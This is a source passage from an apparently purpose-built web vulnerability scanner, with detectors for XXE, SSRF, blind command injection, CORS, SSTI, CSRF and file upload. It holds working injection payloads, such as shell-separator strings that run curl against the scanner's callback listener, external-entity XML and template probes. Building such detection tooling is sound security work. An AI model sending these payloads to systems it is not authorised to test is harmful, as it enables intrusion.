    def candidates(self, ep: Endpoint):
        # Only POST endpoints with form params are candidates for XML replay, and only
        # when the crawl statically learned an XML transformation from JS (DISC-06).
        if (ep.method or "GET").upper() != "POST" or not ep.parameters:
            return []
        from .discovery import JS_XML_HINTS
        roots = sorted(JS_XML_HINTS)
        if not roots:
            return []                       # no JS-learned XML transform: skip (request economy)
        fields = [(p.name, p.value or "1") for p in ep.parameters]
        return [(f"recon|{root}", self._mutation(ep, self._xml(root, fields)))
                for root in roots]

    def expand(self, ep, recon_resp, root):
        """Phase 2 — build the entity differential probes from the recon response."""
        fields = [(p.name, p.value or "1") for p in ep.parameters]
        targets = [p.name for p in ep.parameters]
        body = (recon_resp.body or "") if recon_resp else ""
        # Error-driven element discovery: "Store ID could not be parsed" -> storeId
        err_found = []
        for m in re.finditer(r"([A-Za-z][a-z]{1,20}) ID could not be parsed", body):
            word = m.group(1)
            cand = word[0].lower() + word[1:] + "Id"
            if cand and cand not in targets:
                targets.append(cand)
                err_found.append(cand)
        # FM-17 (first-match audit): error-discovered names carry
        # response-proven priority over the endpoint's own param order —
        # the app itself named the element it failed to parse; a surface
        # with 4+ params used to crowd them out of the [:4] budget.
        probes = []
        for t in ([t for t in err_found]
                  + [t for t in targets if t not in err_found])[:4]:
            # control TWICE: response-determinism gate (blind-XXE targets answer with
            # per-request random values — an unstable control proves the response carries
            # no entity-content information, so the differential is meaningless noise).
            probes.append((f"control|{root}|{t}", self._mutation(ep, self._xml(root, fields, self.CONTROL, t))))
            probes.append((f"control2|{root}|{t}", self._mutation(ep, self._xml(root, fields, self.CONTROL, t))))
            for f in self.FILES:
                probes.append((f"probe|{root}|{t}|{f}", self._mutation(ep, self._xml(root, fields, f, t))))
        return probes

    def analyze(self, pair, resp_map) -> Finding | None:
        ep, _ = pair
        by_elem: dict = {}
        for key, r in resp_map.items():
            parts = key.split("|")
            if parts[0] == "probe":
                by_elem.setdefault(parts[2], {})[parts[3]] = r
            elif parts[0] in ("control", "control2"):
                by_elem.setdefault(parts[2], {})[parts[0]] = r
        for elem, m in by_elem.items():
            ctrl, ctrl2 = m.get("control"), m.get("control2")
            if ctrl is None or ctrl2 is None or len(m) < 4:
                continue
            # stability gate: same control payload twice must produce the SAME response
            if ctrl.status != ctrl2.status or (ctrl.body or "") != (ctrl2.body or ""):
                continue
            diffs = []
            for f, r in m.items():
                if f in ("control", "control2"):
                    continue
                if r.status != ctrl.status or (r.body or "") != (ctrl.body or ""):
                    diffs.append(f"{f.rsplit('/', 1)[-1]}: entity -> {r.status} {(r.body or '')[:30]!r} "
                                 f"vs control {ctrl.status} {(ctrl.body or '')[:30]!r}")
            # both fresh files must differ from control (2 independent confirmations)
            if len(diffs) >= 2:
                root = next((k.split("|")[1] for k in resp_map if k.startswith("probe|")), "?")
                return Finding("xxe", Severity.CRITICAL, ep.url, elem, "POST",
                    [Evidence("entity_differential",
                              f"external entity resolution confirmed via response differential — {'; '.join(diffs[:3])}. "
                              f"recipe: root={root} element={elem}",
                              ctrl.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None

    # ------------------------------------------------------------ OOB (Phase 49)
    def _oob_iid(self, ep, elem: str, tag: str) -> str:
        """Deterministic interaction id: same endpoint+element+tag -> same id across
        runs (evidence stays reproducible; the listener port never leaks into it)."""
        import hashlib
        return "oob-" + hashlib.sha1(f"{ep.url}|{elem}|{tag}".encode()).hexdigest()[:12]

    def _elements_for(self, ep, recon_body: str) -> list[str]:
        """Element targeting for the OOB path: error-discovered elements FIRST (the
        app's own error names the real content target — live-proven on ginandjuice:
        'Store ID could not be parsed' -> storeId), then form params as fallback."""
        params = [p.name for p in ep.parameters]
        discovered = []
        for m in re.finditer(r"([A-Za-z][a-z]{1,20}) ID could not be parsed", recon_body or ""):
            word = m.group(1)
            cand = word[0].lower() + word[1:] + "Id"
            if cand not in discovered:
                discovered.append(cand)
        return discovered + [p for p in params if p not in discovered]

    def oob_attempt(self, ep, root: str, recon_resp, oast) -> Finding | None:
        """BLIND-XXE path (live-proven necessity on ginandjuice.shop stock): when the
        response carries NO entity-content information (stability gate failed above),
        the only evidence channel is an OUT-OF-BAND fetch. Send an external entity
        pointing at our OAST listener; a callback proves server-side entity
        resolution — response-independent, so it works exactly where the response
        oracle cannot. Request economy: first 2 elements only, one probe each."""
        elements = self._elements_for(ep, (recon_resp.body or "") if recon_resp else "")[:2]
        for elem in elements:
            iid = self._oob_iid(ep, elem, "detect")
            fields = [(p.name, p.value or "1") for p in ep.parameters]
            xml = self._xml(root, fields, oast.url(iid), elem)
            m = self._mutation(ep, xml)
            r = self.engine.send(m)
            if r.error:
                continue
            hit = oast.poll(iid, timeout=2.0)
            if hit:
                if is_self_callback(hit, r, oast.url(iid)):
                    continue                    # ENG-08: scanner-initiated fetch, not the target
                h = hit[0]
                # Phase 52: source attribution — the callback's origin IP + UA make
                # the evidence self-contained (live case: ginandjuice.shop fetched
                # its entity from 54.170.155.72 with UA "ginandjuice.shop; ...").
                src = h.get("ip") or h.get("host") or "unknown"
                ua = (h.get("ua") or "")[:60]
                src_txt = f" from {src}" + (f" (ua={ua})" if ua else "")
                # REPRO FIX (2026-10-31, caught by the CI reproducibility
                # gate): the wall-clock 'at t+<epoch>' fragment is removed —
                # a timestamp inside evidence text moved the audit root on
                # every run. The interaction time remains recorded in the
                # OAST interaction log (not hashed).
                return Finding("xxe", Severity.CRITICAL, ep.url, elem, "POST",
                    [Evidence("oob_callback",
                              f"target fetched the external entity out-of-band{src_txt} "
                              f"(interaction {iid} via {h.get('method', 'GET')}) — "
                              f"blind XXE: entity resolution proven with NO response oracle. "
                              f"recipe: root={root} element={elem} iid={iid}",
                              r.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None


# ------------------------------------------------------------ DETECT-11/12 (Phase 53): OAST-channel classes
class SsrfDetector(Detector):
    """DETECT-11 (SSRF, server-side request forgery): params whose name or value
    marks them as URL carriers are pointed at the OAST channel — if the SERVER
    (not the client) fetches our URL, the callback is out-of-band proof of a
    server-side fetch. This is the exact evidence pattern live-proven for blind
    XXE on ginandjuice.shop (v2.4.0): response-independent confirmation.
    Gated on an armed OAST channel (needs_oast) — without one the detector is
    inert (response-only SSRF oracles are unreliable: a 200/latency differential
    is ambient noise on real apps, live-observed on the noise-cycling stock
    endpoint). Request economy: name/value-gated params only, hard probe cap."""
    name, vuln_type = "ssrf", "ssrf"
    severity = Severity.HIGH
    needs_oast = True
    URL_NAMES = {"url", "uri", "link", "href", "page", "redirect", "dest", "destination",
                 "next", "target", "src", "source", "fetch", "callback", "return",
                 "returnto", "continue", "domain", "site", "load", "data", "reference",
                 "proxy", "feed", "open", "window", "image", "img", "out", "nav", "go", "u"}
    MAX_PROBES = 12                     # deterministic budget (endpoint order is deterministic)
    POLL_LOCAL = 0.15                   # local callbacks land synchronously, before the probe response

    def __init__(self, engine, bus, strategy_store=None, oast=None):
        super().__init__(engine, bus, strategy_store)
        self.oast = oast
        self._probes = 0

    def _iid(self, ep, param: str, tag: str) -> str:
        import hashlib
        return "oob-" + hashlib.sha1(f"ssrf|{ep.url}|{param}|{tag}".encode()).hexdigest()[:12]

    def candidates(self, ep: Endpoint):
        if self.oast is None or self._probes >= self.MAX_PROBES:
            return []
        out = []
        for p in ep.parameters:
            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC) or p.flow_control or getattr(p, "is_file", False):
                continue
            val = (p.value or "").lower()
            urlish = p.name.lower() in self.URL_NAMES or val.startswith(("http://", "https://", "//"))
            if not urlish:
                continue
            iid = self._iid(ep, p.name, "detect")
            out.append(RequestMutation(endpoint=ep, param_name=p.name,
                                       param_value=self.oast.url(iid), note=f"ssrf:{iid}"))
            # OWSP-32 (NodeGoat round, live-caught on /research?url=&symbol=):
            # the FILLER twin — same carrier, same interaction id, but empty
            # sibling QUERY params render with a benign constant. The target
            # gated its fetch behind `if (req.query.symbol)` with symbol's
            # discovered base value EMPTY, so the plain probe shipped symbol=
            # (falsy) and the fetch code path never executed. The twin shares
            # the iid: whichever variant's fetch fires, poll() sees the hit.
            out.append(RequestMutation(endpoint=ep, param_name=p.name,
                                       param_value=self.oast.url(iid), note=f"ssrf-fill:{iid}",
                                       fill_query_siblings=True))
            self._probes += 1
            if self._probes >= self.MAX_PROBES:
                break
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if p is None or self.oast is None:
            return None
        iid = self._iid(ep, p.name, "detect")
        hit = self.oast.poll(iid, timeout=(3.0 if getattr(self.oast, "channel", "") in ("public-webhook", "interactsh") else self.POLL_LOCAL))
        if hit:
            if is_self_callback(hit, resp, self.oast.url(iid)):
                return None                      # ENG-08: the scanner fetched it itself
            h = hit[0]
            src = h.get("ip") or "unknown"
            ua = (h.get("ua") or "")[:60]
            return Finding("ssrf", Severity.HIGH, ep.url, p.name, ep.method,
                [Evidence("oob_callback",
                          f"server fetched the attacker-supplied URL out-of-band from {src}"
                          + (f" (ua={ua})" if ua else "") +
                          f" (interaction {iid} via {h.get('method', 'GET')}) — SSRF: the "
                          f"application made the request itself. recipe: param={p.name} iid={iid}",
                          resp.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class CommandInjectionDetector(Detector):
    """DETECT-12 (blind OS command injection): shell-metacharacter variants that
    make the server fetch our OAST URL. A callback proves code LEFT the app's
    shell — the strongest execution evidence short of response output, and the
    ONLY reliable one when command output never reaches the response (blind).
    Lives on the OAST channel like DETECT-11; inert without one. Budget: first
    MAX_PARAMS mutable params per scan, a 2-variant separator battery per param
    (both variants share one interaction id — the battery narrows the trigger
    context, the id stays single so polling stays cheap).
    OWSP-09 (OWASP campaign, live-caught on the OWASP Benchmark): the historical
    MAX_PARAMS=24 floor SILENTLY disabled the whole detector class on any
    surface larger than 24 mutable params — on the Benchmark the battery
    reached params 1-24 of ~2700 and the other ~2670 surfaces were never probed
    for command injection, with zero accounting (candidates=0 looked like
    'absent', it was 'never probed'). The budget now scales to SCAN_WIDE_CAP so
    large surfaces keep coverage, still bounded for cost. NOTE (measured on the
    Benchmark, documented honestly): sinks that call Runtime.exec()/ProcessBuilder
    DIRECTLY (no shell) cannot fire the OOB battery at all — ';'/'&&' are literal
    argv tokens there; a response-oracle battery for exec-family sinks is a
    recorded coverage gap, not something this budget fix addresses."""
    name, vuln_type = "cmdi", "command_injection"
    severity = Severity.CRITICAL
    needs_oast = True
    MAX_PARAMS = 24                     # deterministic floor (small surfaces)
    SCAN_WIDE_CAP = 4096                # OWSP-09 + GTP-04b: large surfaces keep coverage
    VARIANTS = ["; curl -s {u} ;", "&& curl -s {u}"]      # separator battery
    # GTP-04b (round 2, live-caught on the OWASP Benchmark — 77/126 cmdi FNs
    # were argsEnv-shaped): two more payload FORMS for the OOB channel —
    #   ENV-TWIN  'FOO=curl -s {u}'  — the tainted string rides the envp array;
    #   the stock insecureCmd.sh `eval $FOO` executes it. The value after FOO=
    #   must be a VALID command (a separator would be a syntax error in eval).
    #   DIRECT    'curl -s {u}'      — the value IS argv (Runtime.exec(param) /
    #   ProcessBuilder): separators are literal argv tokens there, so the
    #   whole value must be the command. Both are callback-proven (analyze
    #   requires the OAST interaction; a reflection of the URL text is
    #   is_self_callback-excluded and produces no candidate).
    TWIN_VARIANTS = ["FOO=curl -s {u} ;", "curl -s {u}"]
    # CM-1 (cmdi recall round, live-caught on the OWASP Benchmark 8b67a88 —
    # 51-FN root cause A1): the twin forms above were sent on every scan but
    # analyze() only ever polled the "detect" iid, so twin callbacks were
    # never harvested — dead machinery (the twins are the ONLY live forms on
    # envp-array and direct-argv sinks; live: Runtime.exec(String) is NOT a
    # shell — "localhost; curl" -> Cannot run program 'localhost;', and an
    # envp entry only defines a variable when it is an assignment). Each
    # twin now carries its OWN form-tagged iid so analyze() can tell WHICH
    # form fired and record it for the form-aware VR-11 replay.
    TWIN_FORMS = [("twin-env", "FOO=curl -s {u} ;"),   # envp-array sink: the entry IS the assignment
                  ("twin-direct", "curl -s {u}")]      # direct-argv sink: the value IS argv
    VERIFY_TEMPLATE = "| curl -s {u}"    # VR-11: DIFFERENT syntax + fresh id
    POLL_LOCAL = 0.15                   # local callbacks land synchronously

    def __init__(self, engine, bus, strategy_store=None, oast=None):
        super().__init__(engine, bus, strategy_store)
        self.oast = oast
        self._probes = 0

    def _iid(self, ep, param: str, tag: str) -> str:
        import hashlib
        return "oob-" + hashlib.sha1(f"cmdi|{ep.url}|{param}|{tag}".encode()).hexdigest()[:12]

    def candidates(self, ep: Endpoint):
        if self.oast is None or self._probes >= self.SCAN_WIDE_CAP:
            return []
        out = []
        # OWSP-26 (OWASP campaign, live-caught on Mutillidae II 2.12.7): the
        # old `if self._probes >= self.MAX_PARAMS: break` compared the
        # SCAN-WIDE counter inside the PER-ENDPOINT param loop — after the
        # first 24 params anywhere in the scan, every later endpoint got
        # exactly ONE param probed (its first, typically the dead router
        # `page` field), and its real surfaces (dns-lookup.php's target_host,
        # a live OS-cmdi proven by manual callback /pwn1) were NEVER probed.
        # MAX_PARAMS is now a PER-ENDPOINT param bound (the 'deterministic
        # floor for small surfaces' its comment always claimed); SCAN_WIDE_CAP
        # remains the only scan-wide bound.
        ep_params = 0
        for p in ep.parameters:
            # OWSP-04: flow-control (submit-button) params must never carry an
            # APPEND payload either — base+v turned action=submit into
            # "submit; curl ..." and the gated route 405'd the whole probe
            # (live-caught on WrongSecrets 1.8.1, 360 dead requests).
            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC) or p.flow_control or not p.name:
                continue
            base = p.value or "localhost"
            if len(base) > 60:
                base = base[:60]
            iid = self._iid(ep, p.name, "detect")
            for v in self.VARIANTS:
                out.append(RequestMutation(endpoint=ep, param_name=p.name,
                                           param_value=base + v.format(u=self.oast.url(iid)),
                                           note=f"cmdi:{iid}"))
            # GTP-04b: env-array + direct-argv twins — these do NOT prepend the
            # base (the whole value must be the command); CM-1: each twin carries
            # its own FORM-TAGGED iid so the firing form is attributable.
            for tag, tv in self.TWIN_FORMS:
                iid_t = self._iid(ep, p.name, tag)
                out.append(RequestMutation(endpoint=ep, param_name=p.name,
                                           param_value=tv.format(u=self.oast.url(iid_t)),
                                           note=f"cmdi:{iid_t}"))
            # CM-2 (cmdi recall round, root cause A4 — the 15 name-channel FNs,
            # live-caught on the OWASP Benchmark 8b67a88): the resolver family
            # reads the parameter NAME (a getParameterNames scan + value==basename
            # match; live: value-channel probes are provably DEAD there — the
            # 00573 value-control probe returned NO callback while the
            # name-channel form fired on the same surface). The three OOB forms
            # now ride the NAME via a renamed clone (value = the param's declared
            # value = the resolver burhan). Each form is live-proven per family
            # on the running stack: nc-twin-env (00573/00574/01442/02344 envp:
            # the name is the ONE env entry, an assignment), nc-twin-direct
            # (00567/00575/00576/01446/02342/02343 direct-exec, unix cmd="":
            # the name IS argv), nc-variant (00568/01430/01441/02333/02334
            # sh -c concat). The iid is embedded in the payload-NAME (the
            # self-identifying oob-<12hex> marker) so analyze() can poll the
            # channel that fired; the QUERY/BODY gate mirrors the SQ-1/XS-1
            # nminj discipline.
            if p.location in (ParamLocation.QUERY, ParamLocation.BODY):
                _pv = p.value or "1"
                for tag, tpl in (("nc-variant", base + "; curl -s {u} ;"),
                                 ("nc-twin-env", "FOO=curl -s {u} ;"),
                                 ("nc-twin-direct", "curl -s {u}")):
                    iid_nc = self._iid(ep, p.name, tag)
                    payload_nc = tpl.format(u=self.oast.url(iid_nc))
                    epc = _clone_ep_rename_param(ep, p.name, payload_nc)
                    out.append(RequestMutation(endpoint=epc, param_name=payload_nc,
                                               param_value=_pv, note=f"cmdi-nc:{iid_nc}"))
            self._probes += 1
            ep_params += 1
            if ep_params >= self.MAX_PARAMS or self._probes >= self.SCAN_WIDE_CAP:
                break
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if p is None or self.oast is None:
            return None
        # CM-2: a name-channel probe — the payload IS the param NAME and the
        # OAST URL embedded in the name carries the self-identifying iid
        # (oob-<12hex>). Poll THAT channel directly; the form is attributed
        # from the payload shape (the emission templates are distinct by
        # prefix — a marker in a name is impossible for the value channel,
        # whose param names are the app's own field names).
        _name_nc = p.name or ""
        _m_nc = re.search(r"(oob-[0-9a-f]{12})", _name_nc)
        if _m_nc is not None:
            iid = _m_nc.group(1)
            if _name_nc.startswith("FOO="):
                form, _form_txt = "nc-twin-env", (
                    "env-array twin through the NAME channel (the resolver-resolved "
                    "param name rode the envp array into a shell eval)")
            elif _name_nc.startswith("curl -s"):
                form, _form_txt = "nc-twin-direct", (
                    "direct-argv twin through the NAME channel (the resolver-resolved "
                    "param name IS argv, no shell)")
            elif "; curl" in _name_nc or "&& curl" in _name_nc:
                form, _form_txt = "nc-variant", (
                    "separator battery through the NAME channel (the resolver-resolved "
                    "param name reached a shell string)")
            else:
                form, _form_txt = "nc-?", "unknown name-channel form"
            # CM-2 poll budget: the LOCAL channel records the interaction
            # BEFORE the target's process replies (the OAST handler records
            # on arrival, the target's curl round-trip completes inside its
            # handler, and only then is the HTTP response written) — so an
            # IMMEDIATE check is sufficient and the per-mutation 0.15s grace
            # window was pure wall-time waste (live-caught: chunk 00458_00686
            # blew the 470s scan budget; 6-9 nc mutations/endpoint x 0.15s
            # ~= +1s/endpoint). The PUBLIC-WEBHOOK channel is async remote
            # (the callback may land after the response) and keeps 3.0s.
            budget_nc = 3.0 if getattr(self.oast, "channel", "") in ("public-webhook", "interactsh") \
                else 0.0
            hit = self.oast.poll(iid, timeout=budget_nc)
            if hit:
                if is_self_callback(hit, resp, self.oast.url(iid)):
                    return None              # ENG-08: the scanner fetched it itself
                h = hit[0]
                src = h.get("ip") or "unknown"
                return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("oob_callback",
                              f"server executed a blind fetch out-of-band from {src} "
                              f"(interaction {iid}) — blind command injection: form={form} — "
                              f"{_form_txt} triggered an outbound curl. "
                              f"recipe: param={p.name} iid={iid}",
                              resp.request_id),
                     Evidence("input_channel",
                              f"channel=name_channel anchor={_name_nc[:64]} — the payload rode "
                              "the parameter NAME (renamed-clone probe, value = the declared "
                              "value); the verifier must replay the name channel, not a "
                              "value mutation", None)],
                    status=FindingStatus.CANDIDATE, detector="cmdi")
            return None
        # CM-1: ONE combined poll window covers ALL channels for this
        # (endpoint, param): the variant channel ("detect") AND both twin
        # channels ("twin-env", "twin-direct"). Same wall-clock cost as the
        # old single-channel poll (one window; every 50ms cycle checks all
        # channels; timeout=0 peeks return immediately on miss).
        import time as _time_cm1
        budget = 3.0 if getattr(self.oast, "channel", "") in ("public-webhook", "interactsh") else self.POLL_LOCAL
        deadline = _time_cm1.time() + budget
        channels = ("detect", "twin-env", "twin-direct")
        iid = form = hit = None
        while True:
            for tag in channels:
                _iid = self._iid(ep, p.name, tag)
                _hit = self.oast.poll(_iid, timeout=0)
                if _hit:
                    iid, form, hit = _iid, tag, _hit
                    break
            if hit is not None or _time_cm1.time() >= deadline:
                break
            _time_cm1.sleep(0.05)
        if hit:
            if is_self_callback(hit, resp, self.oast.url(iid)):
                return None                      # ENG-08: the scanner fetched it itself
            h = hit[0]
            src = h.get("ip") or "unknown"
            _form_txt = ("env-array twin (the tainted string rode the envp "
                          "array into a shell eval)" if form == "twin-env" else
                          "direct-argv twin (the value IS argv, no shell)" if form == "twin-direct" else
                          "separator battery [';', '&&'] (blind shell fetch)")
            return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                [Evidence("oob_callback",
                          f"server executed a blind fetch out-of-band from {src} "
                          f"(interaction {iid}) — blind command injection: form={form} — "
                          f"{_form_txt} triggered an outbound curl. "
                          f"recipe: param={p.name} iid={iid}",
                          resp.request_id)],
                status=FindingStatus.CANDIDATE, detector="cmdi")
        return None


class CorsDetector(Detector):
    """DETECT-13 (CORS misconfiguration): send a cross-origin probe header; if the
    server REFLECTS an arbitrary Origin in Access-Control-Allow-Origin WHILE
    also allowing credentials, any origin can read authenticated responses —
    the dangerous combination (ACAO:* without credentials is NOT reportable:
    no credentialed access, live doctrine: zero false positives). Header-only
    probe: one request per GET endpoint, no params needed (runs via run(ep)
    — the generic loop is param-bound). Verification (VR-10) replays with a
    FRESH origin value: reflection must repeat to be a finding."""
    name, vuln_type = "cors", "cors_misconfig"
    severity = Severity.HIGH
    PROBE_ORIGIN = "https://burhan-probe.example"
    SKIP_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".svg", ".gif", ".ico", ".woff", ".woff2", ".map")

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "GET").upper() != "GET":
            return None
        if ep.url.split("?")[0].lower().endswith(self.SKIP_EXT):
            return None
        r = self.engine.send(RequestMutation(endpoint=ep, note="cors-probe",
                                             extra_headers={"Origin": self.PROBE_ORIGIN}))
        if r is None or r.error:
            return None
        acao = (r.headers or {}).get("access-control-allow-origin", "")
        acac = (r.headers or {}).get("access-control-allow-credentials", "")
        if self.PROBE_ORIGIN in acao and acac.strip().lower() == "true":
            return Finding("cors_misconfig", Severity.HIGH, ep.url, "Origin", "GET",
                [Evidence("header_reflection",
                          f"arbitrary Origin reflected WITH credentials: "
                          f"Access-Control-Allow-Origin: {acao[:80]} + "
                          f"Access-Control-Allow-Credentials: true — credentialed "
                          f"cross-origin reads from ANY origin", r.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class SstiDetector(Detector):
    """DETECT-15 (Server-Side Template Injection, RCE class): template-syntax
    arithmetic whose COMPUTED result appears in the response while the literal
    expression does not. Reflection-only apps echo the raw expression (literal
    present -> silent); ambient page numbers cannot survive VR-12 (a FRESH
    expression with a different result must evaluate on re-test). Self-driven
    per-endpoint flow (run(ep)) so the winning syntax FAMILY is known at
    analysis time — VR-12 re-tests that family with fresh operands. Battery
    covers the four dominant families: {{ }} (Jinja2/Twig), ${ } (FreeMarker/
    EL/Velocity), <%= %> (ERB), #{ } (Ruby/Thymeleaf)."""
    name, vuln_type = "ssti", "ssti"
    severity = Severity.CRITICAL
    MAX_PARAMS = 12                    # deterministic budget, param order is deterministic
    BATTERY = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
    EXPECT = "49"

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._probes = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if self._probes >= self.MAX_PARAMS:
            return None
        for p in ep.parameters:
            if self._probes >= self.MAX_PARAMS:
                break
            if (p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC, ParamKind.URL, ParamKind.FILENAME)
                    or p.flow_control):
                continue
            self._probes += 1
            for expr in self.BATTERY:
                r = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                     param_value=expr, note=f"ssti:{expr}"))
                if r is None or r.error or not r.ok:
                    continue
                body = r.body or ""
                if self.EXPECT not in body or expr in body:
                    continue          # computed result absent OR raw echo (reflection only)
                return Finding("ssti", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("expression_eval",
                              f"template expression evaluated server-side: 7*7 -> "
                              f"{self.EXPECT} in response while the literal expression "
                              f"is absent — SSTI (RCE class). syntax={expr.split('7')[0]}"
                              f" param={p.name}", r.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None


class CsrfDetector(Detector):
    """DETECT-16 (CSRF): state-changing POST endpoints whose form carries NO
    anti-CSRF token, probed with a hostile Origin+Referer replay. The oracle is
    acceptance: the cross-origin request must succeed like the same-origin
    baseline (same status class + similar body) — token-bearing forms are
    skipped outright (a TOKEN param means protection), read-only surfaces are
    skipped (state-change words gate), and 401/403 baselines are skipped (no
    honest anonymous oracle). VR-13 re-tests with a FRESH hostile origin."""
    name, vuln_type = "csrf", "csrf"
    severity = Severity.MEDIUM
    STATE_WORDS = ("subscribe", "submit", "save", "update", "delete", "remove",
                   "change", "transfer", "profile", "account", "password",
                   "feedback", "comment", "register", "signup", "vote", "follow",
                   "add", "create", "edit", "reset", "action", "donate", "buy",
                   "order", "post", "reply", "review",
                   "cart", "basket", "checkout", "coupon", "place")
    READ_WORDS = ("search", "check", "stock", "view", "find", "login", "signin",
                  "sign-in", "auth", "catalog", "list", "browse")
    PROBE_ORIGIN = "https://csrf-probe.example"

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def _state_changing(self, ep: Endpoint) -> bool:
        # ENG-15 (live-caught on ginandjuice.shop /catalog/cart): the old rule
        # matched READ_WORDS as substrings ANYWHERE in url+params, so a READ
        # word used as a PARENT DIRECTORY ('catalog') demoted every commerce
        # action under it — the tokenless add-to-cart POST was never tested
        # and a proven CSRF (hostile-origin acceptance + SameSite=None cookie,
        # manually verified) went unreported. Words now match on path SEGMENTS
        # + param names; a READ word only demotes when it is a whole WORD of
        # the ACTION segment ('stock-check' reads, 'checkout' does NOT contain
        # the word 'check'), and a state-word PARAM rescues it (?action=remove
        # under a /search action is still a write, but ?address= is not 'add').
        path = urllib.parse.urlsplit(ep.url).path.lower()
        segments = [s for s in path.split("/") if s]
        params = [p.name.lower() for p in ep.parameters]
        tokens = segments + params
        if not any(w in t for t in tokens for w in self.STATE_WORDS):
            return False
        def _words(s: str) -> list:
            return [w for w in re.split(r"[^a-z0-9]+", s) if w]
        action_words = _words(segments[-1]) if segments else []
        if any(w in action_words for w in self.READ_WORDS):
            return any(w in _words(p) for p in params for w in self.STATE_WORDS)
        return True

    def run(self, ep: Endpoint) -> Finding | None:
        # OWSP-17 (OWASP campaign, live-caught on DVWA 3.x): the POST-only gate
        # skipped GET-method state-changing forms — but DVWA's own password-change
        # form is method=GET at low security, and SameSite=Lax (the modern browser
        # default) still attaches cookies to cross-site TOP-LEVEL GET navigations,
        # which makes GET-CSRF the surviving live class for legacy apps (no
        # SameSite attribute at all = both verbs exposed). The state-word gate
        # below still excludes read-only surfaces; OWSP-15's destructive-pair
        # guard keeps the probe non-committing on password-confirm forms.
        if (ep.method or "GET").upper() not in ("POST", "PUT", "PATCH", "DELETE", "GET"):
            return None
        if any(p.kind == ParamKind.TOKEN for p in ep.parameters):
            return None                          # the form carries an anti-CSRF token
        if not self._state_changing(ep):
            return None
        base = self.engine.send(RequestMutation(endpoint=ep, note="csrf-baseline"))
        if base is None or base.error or base.status in (401, 403) or not base.status:
            return None                          # auth-gated: no honest anonymous oracle
        hostile = self.engine.send(RequestMutation(endpoint=ep, note="csrf-probe",
                                                   extra_headers={"Origin": self.PROBE_ORIGIN,
                                                                  "Referer": self.PROBE_ORIGIN + "/x"}))
        if hostile is None or hostile.error or not hostile.status:
            return None
        similar = (hostile.status == base.status
                   and abs(len(hostile.body or "") - len(base.body or ""))
                       <= max(150, 0.25 * max(len(base.body or "x"), 1)))
        if hostile.ok and similar:
            return Finding("csrf", Severity.MEDIUM, ep.url,
                           ", ".join(p.name for p in ep.parameters if p.kind != ParamKind.TOKEN and not p.flow_control) or "-",
                           ep.method,
                [Evidence("cross_origin_acceptance",
                          f"state-changing {ep.method} accepted from hostile origin "
                          f"({self.PROBE_ORIGIN}): baseline -> HTTP {base.status} "
                          f"({len(base.body or '')}B), cross-origin replay -> HTTP "
                          f"{hostile.status} ({len(hostile.body or '')}B) — no CSRF "
                          f"token in the form and no Origin/Referer validation",
                          hostile.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class UploadDetector(Detector):
    """DETECT-18 (OWSP-18, live-caught on DVWA 3.x /vulnerabilities/upload/):
    unrestricted file upload. Multipart forms carrying a <input type=file>
    were probed as urlencoded TEXT params — the file part never shipped, the
    whole upload surface was structurally dead while the battery burned 50+
    requests on a ghost. The detector builds a REAL multipart body with a
    BENIGN canary text file (burhan-<canary>.txt); the oracle is ACCEPTANCE
    (the response echoes the uploaded filename) plus SERVABILITY (the path
    the app itself references is fetched back and must contain the canary
    content). Executable shapes (.php/.jsp/.exe) are deliberately NEVER
    shipped: the capability is proven, not exploited — the L3 safety-doctrine
    applied at detection time. VR-20 re-uploads with a FRESH canary."""
    name, vuln_type = "upload", "unrestricted_file_upload"
    severity = Severity.HIGH

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "POST").upper() not in ("POST", "PUT"):
            return None
        fparams = [p for p in ep.parameters if getattr(p, "is_file", False)]
        if not fparams:
            return None
        f = self._probe(ep, fparams[0])
        if f is None:
            return None
        return f

    def _probe(self, ep: Endpoint, fparam, canary: str | None = None) -> Finding | None:
        import hashlib as _hb
        if canary is None:
            canary = "u" + _hb.sha1(f"{ep.url}|{fparam.name}".encode()).hexdigest()[:9]
        fname = f"burhan-{canary}.txt"
        content = f"burhan-upload-canary {canary}\n"
        fields = [(p.name, p.value or "") for p in ep.parameters
                  if p.name != fparam.name and not getattr(p, "is_file", False)]
        boundary = "----burhan" + canary
        parts = []
        for n, v in fields:
            parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{n}\"\r\n\r\n{v}\r\n")
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{fparam.name}\"; "
                     f"filename=\"{fname}\"\r\nContent-Type: text/plain\r\n\r\n{content}\r\n")
        parts.append(f"--{boundary}--\r\n")
        body = "".join(parts)
        r = self.engine.send(RequestMutation(endpoint=ep, note="upload-probe",
                                             body_override=body,
                                             extra_headers={"Content-Type":
                                                 f"multipart/form-data; boundary={boundary}"}))
        if r is None or r.error or not r.status or not r.ok:
            return None
        rb = r.body or ""
        if fname not in rb:
            return None                          # not echoed: acceptance unprovable
        ev = [Evidence("upload_accepted",
                       f"multipart upload of {fname} accepted (HTTP {r.status}, filename echoed in response)",
                       r.request_id)]
        # serve-check: the app's own reference to the stored file is fetched back
